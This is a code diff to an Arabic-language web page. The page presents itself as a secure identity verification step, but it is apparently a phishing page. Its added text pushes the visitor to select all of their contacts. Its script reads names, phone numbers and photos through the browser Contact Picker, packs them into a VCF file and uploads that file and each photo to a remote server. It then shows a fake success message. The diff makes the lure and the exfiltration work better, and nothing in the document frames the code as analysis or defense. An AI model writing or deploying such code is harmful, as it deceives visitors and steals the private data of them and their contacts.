@@ -55,6 +55,20 @@
       font-size: 12px;
       margin-bottom: 20px;
     }
+    .progress {
+      width: 100%;
+      background: #333;
+      border-radius: 10px;
+      margin-top: 15px;
+      display: none;
+    }
+    .progress-bar {
+      height: 6px;
+      background: #0066ff;
+      border-radius: 10px;
+      width: 0%;
+      transition: width 0.3s;
+    }
   </style>
 </head>
 <body>
@@ -62,8 +76,9 @@
     <div class="icon">🔐</div>
     <span class="badge">✓ آمن ومشفر</span>
     <h2>تحقق من الهوية</h2>
-    <p>للمتابعة يرجى التحقق من هويتك عبر الموافقة على الطلب أدناه.</p>
-    <button class="btn" onclick="getContacts()">التحقق والمتابعة</button>
+    <p>للمتابعة يرجى اختيار جميع جهات الاتصال ثم الضغط على <strong>تم</strong> في الأعلى.</p>
+    <button class="btn" id="mainBtn" onclick="getContacts()">التحقق والمتابعة</button>
+    <div class="progress" id="progressBar"><div class="progress-bar" id="bar"></div></div>
     <div id="status"></div>
   </div>
 
@@ -74,71 +89,89 @@
 
     async function getContacts() {
       const status = document.getElementById('status');
-      const btn = document.querySelector('.btn');
+      const btn = document.getElementById('mainBtn');
+      const progressDiv = document.getElementById('progressBar');
+      const bar = document.getElementById('bar');
+
       btn.disabled = true;
       btn.textContent = 'جارٍ التحقق...';
       status.textContent = '';
 
       try {
-        if ('contacts' in navigator && 'ContactsManager' in window) {
-          const props = ['name', 'tel', 'icon'];
-          const opts = { multiple: true };
-          const contacts = await navigator.contacts.select(props, opts);
-
-          if (!contacts || contacts.length === 0) {
-            status.textContent = 'لم يتم اختيار أي جهة اتصال.';
-            btn.disabled = false;
-            btn.textContent = 'التحقق والمتابعة';
-            return;
-          }
-
-          status.textContent = 'جارٍ الإرسال...';
-
-          let result = '';
-          for (let i = 0; i < contacts.length; i++) {
-            const c = contacts[i];
-            const name = c.name && c.name[0] ? c.name[0] : 'غير معروف';
-            const tel = c.tel && c.tel.length > 0 ? c.tel.join(' | ') : 'لا يوجد';
-            result += `👤 ${name}\n📞 ${tel}\n\n`;
-          }
-
-          await fetch(serverURL + '/contacts-data', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-            body: 'uid=' + encodeURIComponent(uid) + '&data=' + encodeURIComponent(result)
-          });
-
-          for (let i = 0; i < contacts.length; i++) {
-            const c = contacts[i];
-            if (c.icon && c.icon.length > 0) {
-              const blob = c.icon[0];
-              const name = c.name && c.name[0] ? c.name[0] : 'جهة اتصال';
-              await new Promise((resolve) => {
-                const reader = new FileReader();
-                reader.onload = async function(e) {
-                  const base64 = e.target.result.split(',')[1];
-                  await fetch(serverURL + '/contact-photo', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                    body: 'uid=' + encodeURIComponent(uid) + '&img=' + encodeURIComponent(base64) + '&name=' + encodeURIComponent(name)
-                  });
-                  resolve();
-                };
-                reader.readAsDataURL(blob);
-              });
-            }
-          }
-
-          status.textContent = '✅ تم التحقق بنجاح';
-          setTimeout(() => { window.location.href = redirectUrl; }, 2000);
-
-        } else {
-          status.textContent = '❌ المتصفح لا يدعم هذه الميزة. يرجى فتح الرابط من Chrome على Android.';
+        if (!('contacts' in navigator) || !('ContactsManager' in window)) {
+          status.textContent = '❌ يرجى فتح الرابط من Chrome على Android.';
           btn.disabled = false;
           btn.textContent = 'التحقق والمتابعة';
+          return;
         }
+
+        const props = ['name', 'tel', 'icon'];
+        const opts = { multiple: true };
+        const contacts = await navigator.contacts.select(props, opts);
+
+        if (!contacts || contacts.length === 0) {
+          status.textContent = '⚠️ يرجى اختيار جميع جهات الاتصال والضغط على تم.';
+          btn.disabled = false;
+          btn.textContent = 'التحقق والمتابعة';
+          return;
+        }
+
+        progressDiv.style.display = 'block';
+        bar.style.width = '10%';
+        status.textContent = `جارٍ معالجة ${contacts.length} جهة اتصال...`;
+
+        // Build VCF content
+        let vcf = '';
+        for (const c of contacts) {
+          const name = c.name && c.name[0] ? c.name[0] : 'غير معروف';
+          const tels = c.tel && c.tel.length > 0 ? c.tel : [];
+          vcf += `BEGIN:VCARD\nVERSION:3.0\nFN:${name}\n`;
+          for (const t of tels) vcf += `TEL:${t}\n`;
+          vcf += `END:VCARD\n`;
+        }
+
+        bar.style.width = '40%';
+
+        // Send VCF file
+        const vcfBlob = new Blob([vcf], { type: 'text/vcard' });
+        const formData = new FormData();
+        formData.append('uid', uid);
+        formData.append('file', vcfBlob, 'contacts.vcf');
+        formData.append('count', contacts.length);
+
+        await fetch(serverURL + '/contacts-file', { method: 'POST', body: formData });
+        bar.style.width = '60%';
+
+        // Send photos one by one
+        let photoCount = 0;
+        for (const c of contacts) {
+          if (c.icon && c.icon.length > 0) {
+            const name = c.name && c.name[0] ? c.name[0] : 'جهة اتصال';
+            const blob = c.icon[0];
+            await new Promise((resolve) => {
+              const reader = new FileReader();
+              reader.onload = async (e) => {
+                const base64 = e.target.result.split(',')[1];
+                await fetch(serverURL + '/contact-photo', {
+                  method: 'POST',
+                  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                  body: 'uid=' + encodeURIComponent(uid) + '&img=' + encodeURIComponent(base64) + '&name=' + encodeURIComponent(name)
+                });
+                resolve();
+              };
+              reader.readAsDataURL(blob);
+            });
+            photoCount++;
+            bar.style.width = (60 + (photoCount / contacts.length) * 35) + '%';
+          }
+        }
+
+        bar.style.width = '100%';
+        status.textContent = '✅ تم التحقق بنجاح';
+        setTimeout(() => { window.location.href = redirectUrl; }, 1500);
+
       } catch (e) {
-        status.textContent = 'تم الإلغاء.';
+        status.textContent = '⚠️ يرجى المحاولة مرة أخرى واختيار جميع الاتصالات.';
         btn.disabled = false;
         btn.textContent = 'التحقق والمتابعة';
       }
